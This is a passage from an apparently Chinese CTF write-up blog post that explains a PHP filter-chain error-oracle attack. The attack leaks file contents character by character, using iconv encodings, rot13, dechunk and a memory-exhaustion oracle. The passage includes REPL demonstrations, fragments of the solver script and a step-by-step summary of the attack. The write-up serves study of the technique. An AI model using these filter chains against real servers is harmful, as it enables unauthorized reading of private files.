</span></span><span class=line><span class=cl><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/convert.iconv.437.CP930|dechunk/resource=data:,f&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>string</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=s2>&#34;g&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>接下来就是如何判断 a-e 字母了。因为 rot1 对于 a-e 都是生效的，所以我们只需要多次应用 rot1 就可以逐个排除，例如只使用 2 次 rot1 就会触发 Oracle 的那就是字母 e 了，以此类推。</p><p>所以 a-e 的判断不难，但是是不是我们排除 a-e 之后，剩下的就是 f 了呢？并不然，因为我们 dechunk 判断的范围还包括数字，所以我们还需要找到一个对 f 生效，对数字不生效的 filter ，于是作者得到的 filter 如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/convert.iconv.CP1390.CSIBM932|dechunk/resource=data:,f&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>string</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/convert.iconv.CP1390.CSIBM932|dechunk/resource=data:,0&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>string</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=c1>// ... 此处省略，该 filter 对于数字都会产生一个不可见字符，感兴趣的读者自行尝试
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/convert.iconv.CP1390.CSIBM932|dechunk/resource=data:,9&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>string</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=s2>&#34;&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>这就是一个满足我们判断 f 字符的 filter 了。</p><p>此处作者仍然使用了一个filter 处理数字，因为作者没有找到合适的处理数字的 fitler ，所以此处暂时先使用了 <code>*</code> 作为占位符（虽然我觉得可以在排除 f 之后直接 <code>return '*'</code> ，但是作者认为为了避免出错，还是判断为好）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>		<span class=k>elif</span> <span class=ow>not</span> <span class=n>req</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>prefix</span><span class=si>}</span><span class=s1>|convert.iconv.CSISO5427CYRILLIC.855|dechunk|</span><span class=si>{</span><span class=n>blow_up_inf</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>			<span class=k>return</span> <span class=s1>&#39;*&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>PS: 此处作者的脚本为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># a-e</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>n</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>5</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>req</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>prefix</span><span class=si>}</span><span class=s1>|&#39;</span> <span class=o>+</span> <span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>rot1</span><span class=si>}</span><span class=s1>|</span><span class=si>{</span><span class=n>be</span><span class=si>}</span><span class=s1>|&#39;</span><span class=o>*</span><span class=p>(</span><span class=n>n</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>rot1</span><span class=si>}</span><span class=s1>|dechunk|</span><span class=si>{</span><span class=n>blow_up_inf</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;edcba&#39;</span><span class=p>[</span><span class=n>n</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>break</span>
</span></span></code></pre></td></tr></table></div></div><p>使用了 be 编码，此处我的理解为因为作者实际是较长的字符串进行判断的，而此处我为了举例说明，只使用了一个字符，在处理较长字符串的时候可能存在不可见字符等冗余问题需要去除</p><h3 id=part-32-n-s--i-k--v-x>Part 3.2 N-S & I-K & V-X</h3><p>因为有了 a-f 的基本模板，我们剩下的可以尽可能将剩余字符通过 ASCII 移位至这个区间以复用 a-f 的判断，但是 我们找到的 rot1 并不是真正的 rot1 ，只对部分字母区间有效，所以没办法做到全部字母都使用 rot1/rot13 进行转换，但仍然可以解决掉部分字母区间。</p><p>以下几个都是可以通过 ASCII 移位到 a-f 的，所以具体流程不再赘述</p><ul><li>借助 string.rot13 ，我们还可以把 n-s 区间转换成 a-f</li><li>借助 rot1 & rot13 ，我们还可以把 i-k 进行转换</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=c1>// i-k 经过 rot1 后的结果，其余字母都不满足后续要求所以此处只写 i-k
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/convert.iconv.437.CP930/resource=data:,i&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>string</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=s2>&#34;q&#34;</span>
</span></span><span class=line><span class=cl><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/convert.iconv.437.CP930/resource=data:,j&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>string</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=s2>&#34;r&#34;</span>
</span></span><span class=line><span class=cl><span class=nx>php</span> <span class=o>&gt;</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://filter/convert.iconv.437.CP930/resource=data:,k&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>string</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=s2>&#34;s&#34;</span>
</span></span><span class=line><span class=cl><span class=c1>// 再使用 string.ro13 可以得到 d-f ，可以复用之前 a-f 的逻辑，此处不再演示
</span></span></span></code></pre></td></tr></table></div></div><ul><li>再次借助 string.rot13 ，我们可以把 v-x 范围转换成 i-k 范围，再复用上述步骤</li></ul><p>所以目前，我们总共解决了 2*6 + 3*2 = 18 个字母，剩余 26-18=8 个字母需要我们解决。</p><h3 id=part-33---the-rest-alphabets>Part 3.3 - The rest alphabets</h3><p>剩余字母就没有太多技巧了，但是我们在找 filter 的同时，就相对轻松了，因为我们之前排除了 18 个字母，后续如果有 filter 还对这 18 个字母其中几个生效都没关系，相对于找 1to1 的转换大大降低了难度。</p><p>并且，在找到一些字母的转换之后，还可以使用 string.rot13 & rot1 进行转换，实际上我们需要找的字母并不多，这部分具体可以参考作者最后的脚本部分 #295-#344</p><h3 id=part-34---the-numbers>Part 3.4 - The numbers</h3><p>字母处理完了，剩下的就是数字了。</p><p>在 Base64 编码中，因为编码规则都是相对固定的，尤其是相对字符串第一个字节来说，因为在 Base64 分组的时候，第一个字节可以直接编码得到 Base64 编码中的第一位，以 1 为例，如下：</p><p><img src=https://s1.ax1x.com/2022/09/27/xZbluD.png loading=lazy></p><p>所以倘若我们把数字都提取到第一位，并将其进行一次 Base64 编码，得到的编码结果我们再去判断第一位是什么字母，就可以大概推算出数字的范围，例如</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0-3 -&gt; M
</span></span><span class=line><span class=cl>4-7 -&gt; N
</span></span><span class=line><span class=cl>8-9 -&gt; O
</span></span></code></pre></td></tr></table></div></div><p>然后我们再使用 r2 交换 Base64 的第二位，因为在 Base64 分组中，Base64 的第二位的高 bit 位仍然受到原文第一个字节的影响，所以根据编码结果第二位的范围我们就可以最终确定这个数字是什么了！例如 0-3 :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0 -&gt; CDEFGH
</span></span><span class=line><span class=cl>1 -&gt; STUVWX
</span></span><span class=line><span class=cl>2 -&gt; ijklmn
</span></span><span class=line><span class=cl>3 -&gt; yz*
</span></span></code></pre></td></tr></table></div></div><p>当然仍然有可能编码结果下一位仍然是数字，例如 3s 编码结果为 M3M= ，但是根据我们之前把 0-2 都排除了，剩余的就剩下是 3 了，所以依旧可以判断出来。</p><p>此部分对应作者脚本的 #351-#393 ，其余数字类似，就不再赘述。</p><p>至此，我们基本完成了所有字符的对应翻译工作，这个题也算是基本解决了。</p><h3 id=part-35---additional-notes>Part 3.5 - Additional Notes</h3><p>有小伙伴提到了一个我没有注意到的问题，就是最后翻译 Base64 编码的时候，为什么不用翻译 +/ 呢？这些不都在 Base64 编码范围之内呢？</p><p>这个问题当时就问到了我，还好跟其他小伙伴一起讨论了一下发现了这个小细节。之前我认为作者使用两次 Base64 ，第一次是为了编码非标准字符，然后使得做 padding 的时候更标准，然后第二次编码可以得到两个 = 的编码结果。但是其实我觉得这里还有个更合理，或者作者也没考虑到，但是确实这样不用翻译 +/ 的理由。</p><p>就是在第一次编码之后，无论文件内容是什么，最后结果都会是 Base64 编码字符内的 ASCII 字符，而在 Base64 编码范围内的字符的二进制，最高位都不会是 1 ，可以看看码表：<a class=link href=http://c.biancheng.net/c/ascii/ target=_blank rel=noopener>ASCII码一览表，ASCII码对照表</a></p><p>而对于 Base64 编码来说，+/ 的编码分别是：111110/111111 ，可以看到最高位都需要为 1 。</p><p><img src="https://images.zsxq.com/FpV6lsDc0niPXFMr-vCYKKooztR4?imageMogr2/auto-orient/quality/100!/ignore-error/1&amp;e=1669823999&amp;token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:IlQNYaSATVI24r1di7wYEavOJf8=" loading=lazy></p><p>而我们可以从图中看到：</p><ol><li>开头字节无法让第一个 Bit 为 1</li><li>红色箭头处都是因为 ASCII 第一个 bit 不会是 1</li><li>中间部分由于 plantext 第一个bit无法为1的缘故都不能满足要求</li><li>蓝色部分是稍微比较好的情况，但是在这种情况下编码最大值只能到 9</li><li>最后一组编码虽然最好情况可以编码成 + ，但是需要 plaintext 为 DEL(0x7f)，但是这是经过第一次 Bae64 编码后的，所以 plaintext 不会存在 DEL 的情况</li></ol><p>综述，经过两次 Base64 之后的编码结果是不存在 +/ 的，所以我们并不需要翻译 +/ 这两个字符</p><h2 id=summary>Summary</h2><p>让我们再次总结一下，整体流程大致如下：</p><ol><li>第一步，先判断出多少个 UCS-4LE 会引起服务器报错，获取到这个数值的临界值</li><li>第二步，利用 convert.iconv..CSISO2022KR 产生固定的 <code>\x1b$)C</code> 固定的 padding 与原来的 FLAG 拼接使得得到的 base64 结果最后会有两个等号</li><li>第三步，使用 UCS-2BE 等编码技巧交换字符顺序，使得后面的字符挨个轮换至第一个字节</li><li>第四步，使用编码技巧将第一个字节的字符转换成 dechunk 能够判断的字符范围内，并使用 Base64 将数字转换成字母进一步准确判断数字</li><li>最后将得到的 Base64 编码结果解码，并按照之前增加了多少个 padding 剔除几个 padding</li></ol><p>另外，一些写这篇文章时候的探讨:</p><ul><li>由于 dechunk是 php 5.3 之后引进的，当然这个技巧是 php7 也可以使用，所以实际上他跟 php 8 没多大关系</li><li>理论上来说，在我们可控任意支持 php filter 函数参数的情况下，与 phar 有一些类似，任何与文件操作有关的函数都可以被利用来侧信道读取文件内容</li><li>理论上来说，除了使用 convert.iconv.L1.UCS-4LE 产生大量冗余字符导致 PHP 内存溢出外，还可以使用其他编码形式，例如甚至多次 Base64 ，毕竟目的只是需要让 PHP 产生内存错误，方法还是比较多的</li><li>当然，该利用也有一定限制，比如 5.3 以下就不行，可能得需要找另外一些 Oracle ，以及与 iconv LFI 一样，该方法极度依赖系统 iconv 提供的字符集</li></ul><p>本篇算是我迄今为止写的最累的一篇文章之一，因为作者在原脚本里面并没有非常详细介绍每一个细节，以及为什么我们需要这么做，所以在理解脚本上费了很大的功夫，再加上还要把它写出来，就更累了。</p><p>不过我觉得这个题带来的攻击技巧很有意思，特别是深入每一个细节后，没想到处处都是细节，而且这非常 ctf ，每次都是解决一个问题之后又遇到一个问题，又需要我们再度解决这个问题，一环扣一环。后面跟作者聊天的时候，他表示自己弄整个 solution 差不多花了 15 个小时，预期是 0 解或者 1 解，最后果不其然是 0 解。</p><p>另外，与本题无关的是，我们还可以利用 iconv 来产生一些文件头从而绕过一些文件函数的检测，比如产生一个 GIF 字符可以绕过某些图片的检测等，可以看看这位同学的实践案例：https://github.com/Taiwan-Tech-WebSec/Bug-Report/issues/91 ，也可以看看 CakeCTF 2022 中的 ImageSurfing ，当然也欢迎来 「Funny Web CTF」来探讨有意思的题目或者 Web 技术。</p><blockquote><p>我正在「Funny Web CTF」和朋友们讨论有趣的话题，你⼀起来吧？https://t.zsxq.com/067y7iAuf</p></blockquote><p>最后，虽然 iconv 很好玩（?），但是我写完之后已经不希望大家继续卷这玩意了，毕竟这玩意要是像 phar 一样被某些 CTF 出题人盯上，有点像打开了潘多拉魔盒，对于选手来说简直是灾难级的（反正我是不会再想去做这类题目了的）。</p><p>不过还是比较期待，希望还能写下一篇 The End of ???</p></section><footer class=article-footer><section class=article-tags><a href=/tags/sec/>Sec</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section><br><div class="notice tip"><p class=notice-title><span class="icon-notice baseline"><svg viewBox="300.5 134 300 300"><path d="M551.281 252.36c0-3.32-1.172-6.641-3.515-8.985l-17.774-17.578c-2.344-2.344-5.469-3.711-8.789-3.711-3.32.0-6.445 1.367-8.789 3.71l-79.687 79.493-44.141-44.14c-2.344-2.344-5.469-3.712-8.79-3.712-3.32.0-6.444 1.368-8.788 3.711l-17.774 17.579c-2.343 2.343-3.515 5.664-3.515 8.984s1.172 6.445 3.515 8.789l70.704 70.703c2.343 2.344 5.664 3.711 8.789 3.711 3.32.0 6.64-1.367 8.984-3.71l106.055-106.056c2.343-2.343 3.515-5.468 3.515-8.789zM600.5 284c0 82.813-67.188 150-150 150-82.813.0-150-67.188-150-150 0-82.813 67.188-150 150-150 82.813.0 150 67.188 150 150z"/></svg>
</span>Tip</p><p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://zeddyu.github.io/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://zeddyu.github.io/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://zeddyu.github.io/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p></div></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/a-magic-way-of-xss-in-http/2/><div class=article-details><h2 class=article-title>A Magic Way of XSS in HTTP/2</h2></div></a></article><article><a href=/p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/><div class=article-details><h2 class=article-title>一篇文章带你读懂 TLS Poison 攻击</h2></div></a></article><article><a href=/p/help-you-understand-http-smuggling-in-one-article/><div class=article-details><h2 class=article-title>Help you understand HTTP Smuggling in one article</h2></div></a></article><article><a href=/p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-http-smuggling-%E6%94%BB%E5%87%BB/><div class=article-details><h2 class=article-title>一篇文章带你读懂 HTTP Smuggling 攻击</h2></div></a></article><article><a href=/p/vulnerabilites-for-a2os/><div class=article-details><h2 class=article-title>Vulnerabilites For A2OS</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo=ZeddYu/ZeddYu.github.io data-repo-id="MDEwOlJlcG9zaXRvcnkzMzgyODQ1OTY=" data-category=Announcements data-category-id=DIC_kwDOFCnQNM4ClsKy data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=en data-loading=lazy crossorigin=anonymous async></script><script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"light":"dark_dimmed")}})()</script><footer class=site-footer><section class=copyright>&copy;
2020 -
2025 Zeddy's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.29.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.zdy.one/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=https://cdn.zdy.world/gh/zeddyu/zeddyu.github.io///ts/main.js defer integrity="sha256-Hpo7r9hGztTDRdCEs1X7jHuudXAcM4+KH4qCx4ATeCY=" crossorigin=anonymous></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><script>"serviceWorker"in navigator&&window.addEventListener("load",function(){navigator.serviceWorker.register("https://zeddyu.github.io/sw.min.js").then(function(e){console.log("ServiceWorker registration successful with scope: ",e.scope)},function(e){console.log("ServiceWorker registration failed: ",e)})})</script><script src=https://cdn.zdy.one/npm/quicklink@2.3.0/dist/quicklink.umd.js defer integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin=anonymous></script><script>function checkNetworkEnvironment(){if(navigator.connection){const e=navigator.connection,t=e.effectiveType==="4g"&&e.downlink>5;t?quicklink.listen():console.log("Network is poor, skipping speculation rules")}else console.log("Network Information API not supported")}window.addEventListener("load",checkNetworkEnvironment)</script></body></html>